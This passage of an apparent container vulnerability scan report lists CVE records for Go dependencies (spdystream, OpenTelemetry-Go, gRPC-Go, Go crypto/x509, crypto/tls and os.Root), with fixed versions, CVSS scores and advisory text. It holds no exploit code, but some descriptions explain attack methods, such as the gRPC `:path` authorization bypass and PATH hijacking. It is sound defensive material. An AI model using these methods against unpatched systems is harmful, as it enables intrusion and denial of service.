│     │      │                  ├ [1]: https://github.com/moby/spdystream 
│     │      │                  ├ [2]: https://github.com/moby/spdystream/releases/tag/v0.5.1 
│     │      │                  ├ [3]: https://github.com/moby/spdystream/security/advisories/GHSA-pc3f-x583-g7j2 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-35469 
│     │      │                  ╰ [5]: https://www.cve.org/CVERecord?id=CVE-2026-35469 
│     │      ├ PublishedDate   : 2026-04-16T22:16:37.92Z 
│     │      ╰ LastModifiedDate: 2026-04-29T21:04:10.06Z 
│     ├ [4]  ╭ VulnerabilityID : CVE-2026-29181 
│     │      ├ VendorIDs        ─ [0]: GHSA-mh2q-q3fh-2475 
│     │      ├ PkgID           : go.opentelemetry.io/otel@v1.37.0 
│     │      ├ PkgName         : go.opentelemetry.io/otel 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/go.opentelemetry.io/otel@v1.37.0 
│     │      │                  ╰ UID : 4e08428689a0c42e 
│     │      ├ InstalledVersion: v1.37.0 
│     │      ├ FixedVersion    : 1.41.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-29181 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:4b731766a80bfc4bb3df0ea55dbcf206372b8bb6ab845edb076f857ba1968ec8 
│     │      ├ Title           : OpenTelemetry-Go: multi-value `baggage` header extraction causes excessive
│     │      │                   allocations (remote dos amplification) 
│     │      ├ Description     : OpenTelemetry-Go is the Go implementation of OpenTelemetry. From 1.36.0 to
│     │      │                   1.40.0, multi-value baggage: header extraction parses each header field-value
│     │      │                   independently and aggregates members across values. This allows an attacker to
│     │      │                    amplify cpu and allocations by sending many baggage: header lines, even when
│     │      │                   each individual value is within the 8192-byte per-value parse limit. This
│     │      │                   vulnerability is fixed in 1.41.0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                         ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0]: https://github.com/open-telemetry/opentelemetry-go 
│     │      │                  ├ [1]: https://github.com/open-telemetry/opentelemetry-go/commit/aa1894e09e3fe6
│     │      │                  │      6860c7885cb40f98901b35277f 
│     │      │                  ├ [2]: https://github.com/open-telemetry/opentelemetry-go/pull/7880 
│     │      │                  ├ [3]: https://github.com/open-telemetry/opentelemetry-go/releases/tag/v1.41.0 
│     │      │                  ├ [4]: https://github.com/open-telemetry/opentelemetry-go/security/advisories/G
│     │      │                  │      HSA-mh2q-q3fh-2475 
│     │      │                  ╰ [5]: https://nvd.nist.gov/vuln/detail/CVE-2026-29181 
│     │      ├ PublishedDate   : 2026-04-07T21:17:16.003Z 
│     │      ╰ LastModifiedDate: 2026-04-14T18:45:01.363Z 
│     ├ [5]  ╭ VulnerabilityID : CVE-2026-24051 
│     │      ├ VendorIDs        ─ [0]: GHSA-9h8m-3fm2-qjrq 
│     │      ├ PkgID           : go.opentelemetry.io/otel/sdk@v1.37.0 
│     │      ├ PkgName         : go.opentelemetry.io/otel/sdk 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/go.opentelemetry.io/otel/sdk@v1.37.0 
│     │      │                  ╰ UID : badfb66d9fa38d4c 
│     │      ├ InstalledVersion: v1.37.0 
│     │      ├ FixedVersion    : 1.40.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-24051 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:ef365167371699fe784dd491196e413afabeaf1efdac0e351ac1e92be6907842 
│     │      ├ Title           : OpenTelemetry Go SDK Vulnerable to Arbitrary Code Execution via PATH Hijacking 
│     │      ├ Description     : OpenTelemetry-Go is the Go implementation of OpenTelemetry. The OpenTelemetry
│     │      │                   Go SDK in version v1.20.0-1.39.0 is vulnerable to Path Hijacking (Untrusted
│     │      │                   Search Paths) on macOS/Darwin systems. The resource detection code in
│     │      │                   sdk/resource/host_id.go executes the ioreg system command using a search path.
│     │      │                    An attacker with the ability to locally modify the PATH environment variable
│     │      │                   can achieve Arbitrary Code Execution (ACE) within the context of the
│     │      │                   application. A fix was released with v1.40.0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-426 
│     │      ├ VendorSeverity   ─ ghsa: 3 
│     │      ├ CVSS             ─ ghsa ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                         ╰ V3Score : 7 
│     │      ├ References       ╭ [0]: https://github.com/open-telemetry/opentelemetry-go 
│     │      │                  ├ [1]: https://github.com/open-telemetry/opentelemetry-go/commit/d45961bcda453f
│     │      │                  │      cbdb6469c22d6e88a1f9970a53 
│     │      │                  ├ [2]: https://github.com/open-telemetry/opentelemetry-go/security/advisories/G
│     │      │                  │      HSA-9h8m-3fm2-qjrq 
│     │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-24051 
│     │      │                  ╰ [4]: https://pkg.go.dev/vuln/GO-2026-4394 
│     │      ├ PublishedDate   : 2026-02-02T23:16:07.963Z 
│     │      ╰ LastModifiedDate: 2026-02-27T20:32:10.693Z 
│     ├ [6]  ╭ VulnerabilityID : CVE-2026-39883 
│     │      ├ VendorIDs        ─ [0]: GHSA-hfvc-g4fc-pqhx 
│     │      ├ PkgID           : go.opentelemetry.io/otel/sdk@v1.37.0 
│     │      ├ PkgName         : go.opentelemetry.io/otel/sdk 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/go.opentelemetry.io/otel/sdk@v1.37.0 
│     │      │                  ╰ UID : badfb66d9fa38d4c 
│     │      ├ InstalledVersion: v1.37.0 
│     │      ├ FixedVersion    : 1.43.0 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-39883 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:3c8921371469130645ea65f90fc201b6796a65b3820204a61b8f00204c10854a 
│     │      ├ Title           : opentelemetry-go: BSD kenv command not using absolute path enables PATH
│     │      │                   hijacking 
│     │      ├ Description     : OpenTelemetry-Go is the Go implementation of OpenTelemetry. From 1.15.0 to
│     │      │                   1.42.0, the fix for CVE-2026-24051 changed the Darwin ioreg command to use an
│     │      │                   absolute path but left the BSD kenv command using a bare name, allowing the
│     │      │                   same PATH hijacking attack on BSD and Solaris platforms. This vulnerability is
│     │      │                    fixed in 1.43.0. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-426 
│     │      ├ VendorSeverity   ╭ ghsa: 3 
│     │      │                  ╰ nvd : 3 
│     │      ├ CVSS             ╭ ghsa ╭ V40Vector: CVSS:4.0/AV:L/AC:H/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/
│     │      │                  │      │            SA:N 
│     │      │                  │      ╰ V40Score : 7.3 
│     │      │                  ╰ nvd  ╭ V3Vector: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H 
│     │      │                         ╰ V3Score : 7 
│     │      ├ References       ╭ [0]: http://github.com/open-telemetry/opentelemetry-go/releases/tag/v1.43.0 
│     │      │                  ├ [1]: https://github.com/open-telemetry/opentelemetry-go 
│     │      │                  ├ [2]: https://github.com/open-telemetry/opentelemetry-go/security/advisories/G
│     │      │                  │      HSA-hfvc-g4fc-pqhx 
│     │      │                  ╰ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-39883 
│     │      ├ PublishedDate   : 2026-04-08T21:17:00.697Z 
│     │      ╰ LastModifiedDate: 2026-04-10T21:16:27.12Z 
│     ├ [7]  ╭ VulnerabilityID : CVE-2026-33186 
│     │      ├ VendorIDs        ─ [0]: GHSA-p77j-4mvh-x3m3 
│     │      ├ PkgID           : google.golang.org/grpc@v1.75.0 
│     │      ├ PkgName         : google.golang.org/grpc 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/google.golang.org/grpc@v1.75.0 
│     │      │                  ╰ UID : dc760fcc5f8111f9 
│     │      ├ InstalledVersion: v1.75.0 
│     │      ├ FixedVersion    : 1.79.3 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : ghsa 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33186 
│     │      ├ DataSource       ╭ ID  : ghsa 
│     │      │                  ├ Name: GitHub Security Advisory Go 
│     │      │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago 
│     │      ├ Fingerprint     : sha256:061fa8d0398c1e50cf805576e7fcda41a6547579cfcd8399c3519f9601ef7e00 
│     │      ├ Title           : google.golang.org/grpc/grpc-go: google.golang.org/grpc/authz: gRPC-Go:
│     │      │                   Authorization bypass due to improper HTTP/2 path validation 
│     │      ├ Description     : gRPC-Go is the Go language implementation of gRPC. Versions prior to 1.79.3
│     │      │                   have an authorization bypass resulting from improper input validation of the
│     │      │                   HTTP/2 `:path` pseudo-header. The gRPC-Go server was too lenient in its
│     │      │                   routing logic, accepting requests where the `:path` omitted the mandatory
│     │      │                   leading slash (e.g., `Service/Method` instead of `/Service/Method`). While the
│     │      │                    server successfully routed these requests to the correct handler,
│     │      │                   authorization interceptors (including the official `grpc/authz` package)
│     │      │                   evaluated the raw, non-canonical path string. Consequently, "deny" rules
│     │      │                   defined using canonical paths (starting with `/`) failed to match the incoming
│     │      │                    request, allowing it to bypass the policy if a fallback "allow" rule was
│     │      │                   present. This affects gRPC-Go servers that use path-based authorization
│     │      │                   interceptors, such as the official RBAC implementation in
│     │      │                   `google.golang.org/grpc/authz` or custom interceptors relying on
│     │      │                   `info.FullMethod` or `grpc.Method(ctx)`; AND that have a security policy
│     │      │                   contains specific "deny" rules for canonical paths but allows other requests
│     │      │                   by default (a fallback "allow" rule). The vulnerability is exploitable by an
│     │      │                   attacker who can send raw HTTP/2 frames with malformed `:path` headers
│     │      │                   directly to the gRPC server. The fix in version 1.79.3 ensures that any
│     │      │                   request with a `:path` that does not start with a leading slash is immediately
│     │      │                    rejected with a `codes.Unimplemented` error, preventing it from reaching
│     │      │                   authorization interceptors or handlers with a non-canonical path string. While
│     │      │                    upgrading is the most secure and recommended path, users can mitigate the
│     │      │                   vulnerability using one of the following methods: Use a validating interceptor
│     │      │                    (recommended mitigation); infrastructure-level normalization; and/or policy
│     │      │                   hardening. 
│     │      ├ Severity        : CRITICAL 
│     │      ├ CweIDs           ─ [0]: CWE-285 
│     │      ├ VendorSeverity   ╭ amazon: 3 
│     │      │                  ├ ghsa  : 4 
│     │      │                  ├ photon: 4 
│     │      │                  ╰ redhat: 3 
│     │      ├ CVSS             ╭ ghsa   ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N 
│     │      │                  │        ╰ V3Score : 9.1 
│     │      │                  ╰ redhat ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N 
│     │      │                           ╰ V3Score : 9.1 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-33186 
│     │      │                  ├ [1]: https://github.com/grpc/grpc-go 
│     │      │                  ├ [2]: https://github.com/grpc/grpc-go/security/advisories/GHSA-p77j-4mvh-x3m3 
│     │      │                  ├ [3]: https://nvd.nist.gov/vuln/detail/CVE-2026-33186 
│     │      │                  ╰ [4]: https://www.cve.org/CVERecord?id=CVE-2026-33186 
│     │      ├ PublishedDate   : 2026-03-20T23:16:45.18Z 
│     │      ╰ LastModifiedDate: 2026-04-10T20:49:17.737Z 
│     ├ [8]  ╭ VulnerabilityID : CVE-2026-32280 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4947 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32280 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:85afe0f56b48374bf514d0e586651574e86b2406d8deebda181ff5ea0930289f 
│     │      ├ Title           : crypto/x509: crypto/tls: golang: Go: Denial of Service vulnerability in
│     │      │                   certificate chain building 
│     │      ├ Description     : During chain building, the amount of work that is done is not correctly
│     │      │                   limited when a large number of intermediate certificates are passed in
│     │      │                   VerifyOptions.Intermediates, which can lead to a denial of service. This
│     │      │                   affects both direct users of crypto/x509 and users of crypto/tls. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32280 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/758320 
│     │      │                  ├ [14]: https://go.dev/issue/78282 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32280.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32280 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4947 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32280 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.247Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:16:42.18Z 
│     ├ [9]  ╭ VulnerabilityID : CVE-2026-32281 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4946 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32281 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:0d4bfdfce33537e92e225ab626e808f8044ae64d5804a07efa4f4838d17e027b 
│     │      ├ Title           : crypto/x509: golang: Go crypto/x509: Denial of Service via inefficient
│     │      │                   certificate chain validation 
│     │      ├ Description     : Validating certificate chains which use policies is unexpectedly inefficient
│     │      │                   when certificates in the chain contain a very large number of policy mappings,
│     │      │                    possibly causing denial of service. This only affects validation of otherwise
│     │      │                    trusted certificate chains, issued by a root CA in the VerifyOptions.Roots
│     │      │                   CertPool, or in the system certificate pool. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-295 
│     │      ├ VendorSeverity   ╭ amazon : 3 
│     │      │                  ├ bitnami: 3 
│     │      │                  ├ nvd    : 3 
│     │      │                  ╰ redhat : 2 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 5.9 
│     │      ├ References       ╭ [0]: https://access.redhat.com/security/cve/CVE-2026-32281 
│     │      │                  ├ [1]: https://go.dev/cl/758061 
│     │      │                  ├ [2]: https://go.dev/issue/78281 
│     │      │                  ├ [3]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-32281 
│     │      │                  ├ [5]: https://pkg.go.dev/vuln/GO-2026-4946 
│     │      │                  ╰ [6]: https://www.cve.org/CVERecord?id=CVE-2026-32281 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.35Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:15:57.75Z 
│     ├ [10] ╭ VulnerabilityID : CVE-2026-32283 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4870 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32283 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:afa678405fe6e65d8c83a603d698c3e6f94e6b74f2c6335c5aac1a88acb32334 
│     │      ├ Title           : crypto/tls: golang: Go crypto/tls: Denial of Service via multiple TLS 1.3 key
│     │      │                   update messages 
│     │      ├ Description     : If one side of the TLS connection sends multiple key update messages
│     │      │                   post-handshake in a single record, the connection can deadlock, causing
│     │      │                   uncontrolled consumption of resources. This can lead to a denial of service.
│     │      │                   This only affects TLS 1.3. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-770 
│     │      ├ VendorSeverity   ╭ alma       : 3 
│     │      │                  ├ amazon     : 3 
│     │      │                  ├ bitnami    : 3 
│     │      │                  ├ nvd        : 3 
│     │      │                  ├ oracle-oval: 3 
│     │      │                  ├ redhat     : 3 
│     │      │                  ╰ rocky      : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                  │         ╰ V3Score : 7.5 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H 
│     │      │                            ╰ V3Score : 7.5 
│     │      ├ References       ╭ [0] : https://access.redhat.com/errata/RHSA-2026:14200 
│     │      │                  ├ [1] : https://access.redhat.com/security/cve/CVE-2026-32283 
│     │      │                  ├ [2] : https://bugzilla.redhat.com/2456336 
│     │      │                  ├ [3] : https://bugzilla.redhat.com/2456338 
│     │      │                  ├ [4] : https://bugzilla.redhat.com/2456339 
│     │      │                  ├ [5] : https://bugzilla.redhat.com/show_bug.cgi?id=2456336 
│     │      │                  ├ [6] : https://bugzilla.redhat.com/show_bug.cgi?id=2456338 
│     │      │                  ├ [7] : https://bugzilla.redhat.com/show_bug.cgi?id=2456339 
│     │      │                  ├ [8] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32280 
│     │      │                  ├ [9] : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32282 
│     │      │                  ├ [10]: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-32283 
│     │      │                  ├ [11]: https://errata.almalinux.org/9/ALSA-2026-14200.html 
│     │      │                  ├ [12]: https://errata.rockylinux.org/RLSA-2026:11514 
│     │      │                  ├ [13]: https://go.dev/cl/763767 
│     │      │                  ├ [14]: https://go.dev/issue/78334 
│     │      │                  ├ [15]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [16]: https://linux.oracle.com/cve/CVE-2026-32283.html 
│     │      │                  ├ [17]: https://linux.oracle.com/errata/ELSA-2026-14200.html 
│     │      │                  ├ [18]: https://nvd.nist.gov/vuln/detail/CVE-2026-32283 
│     │      │                  ├ [19]: https://pkg.go.dev/vuln/GO-2026-4870 
│     │      │                  ╰ [20]: https://www.cve.org/CVERecord?id=CVE-2026-32283 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.58Z 
│     │      ╰ LastModifiedDate: 2026-04-16T19:12:10.54Z 
│     ├ [11] ╭ VulnerabilityID : CVE-2026-33810 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4866 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-33810 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:3b4d2963ebe663e89fdd3da153f2bd9a710c4425f2827382879041dea975f37b 
│     │      ├ Title           : crypto/x509: golang: Go crypto/x509: Certificate validation bypass due to
│     │      │                   incorrect DNS constraint application 
│     │      ├ Description     : When verifying a certificate chain containing excluded DNS constraints, these
│     │      │                   constraints are not correctly applied to wildcard DNS SANs which use a
│     │      │                   different case than the constraint. This only affects validation of otherwise
│     │      │                   trusted certificate chains, issued by a root CA in the VerifyOptions.Roots
│     │      │                   CertPool, or in the system certificate pool. 
│     │      ├ Severity        : HIGH 
│     │      ├ CweIDs           ─ [0]: CWE-295 
│     │      ├ VendorSeverity   ╭ azure  : 2 
│     │      │                  ├ bitnami: 3 
│     │      │                  ├ nvd    : 3 
│     │      │                  ╰ redhat : 3 
│     │      ├ CVSS             ╭ bitnami ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N 
│     │      │                  │         ╰ V3Score : 8.2 
│     │      │                  ├ nvd     ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N 
│     │      │                  │         ╰ V3Score : 8.2 
│     │      │                  ╰ redhat  ╭ V3Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:L 
│     │      │                            ╰ V3Score : 8.8 
│     │      ├ References       ╭ [0]: http://www.openwall.com/lists/oss-security/2026/04/19/4 
│     │      │                  ├ [1]: http://www.openwall.com/lists/oss-security/2026/04/20/1 
│     │      │                  ├ [2]: https://access.redhat.com/security/cve/CVE-2026-33810 
│     │      │                  ├ [3]: https://go.dev/cl/763763 
│     │      │                  ├ [4]: https://go.dev/issue/78332 
│     │      │                  ├ [5]: https://groups.google.com/g/golang-announce/c/0uYbvbPZRWU 
│     │      │                  ├ [6]: https://nvd.nist.gov/vuln/detail/CVE-2026-33810 
│     │      │                  ├ [7]: https://pkg.go.dev/vuln/GO-2026-4866 
│     │      │                  ╰ [8]: https://www.cve.org/CVERecord?id=CVE-2026-33810 
│     │      ├ PublishedDate   : 2026-04-08T02:16:03.95Z 
│     │      ╰ LastModifiedDate: 2026-04-20T18:16:26.813Z 
│     ├ [12] ╭ VulnerabilityID : CVE-2026-32282 
│     │      ├ VendorIDs        ─ [0]: GO-2026-4864 
│     │      ├ PkgID           : stdlib@v1.26.1 
│     │      ├ PkgName         : stdlib 
│     │      ├ PkgIdentifier    ╭ PURL: pkg:golang/stdlib@v1.26.1 
│     │      │                  ╰ UID : fd1b63a55787cf45 
│     │      ├ InstalledVersion: v1.26.1 
│     │      ├ FixedVersion    : 1.25.9, 1.26.2 
│     │      ├ Status          : fixed 
│     │      ├ Layer            ╭ Digest: sha256:b2da923976b152f173c894eb48f363a3a90df419be5d71630b29e4dd4bf2b510 
│     │      │                  ╰ DiffID: sha256:08617ac9c48742b6401ecfa4a85132b9eaa4f561b5cd03b8d6e998f2527dbde6 
│     │      ├ SeveritySource  : nvd 
│     │      ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-32282 
│     │      ├ DataSource       ╭ ID  : govulndb 
│     │      │                  ├ Name: The Go Vulnerability Database 
│     │      │                  ╰ URL : https://pkg.go.dev/vuln/ 
│     │      ├ Fingerprint     : sha256:7116587b17826e15b1f50a2ba60c9132812515f4f8dd74c6f729186afbd32829 
│     │      ├ Title           : golang: internal/syscall/unix: Root.Chmod can follow symlinks out of the root 
│     │      ├ Description     : On Linux, if the target of Root.Chmod is replaced with a symlink while the
│     │      │                   chmod operation is in progress, Chmod can operate on the target of the
│     │      │                   symlink, even when the target lies outside the root. The Linux fchmodat
│     │      │                   syscall silently ignores the AT_SYMLINK_NOFOLLOW flag, which Root.Chmod uses
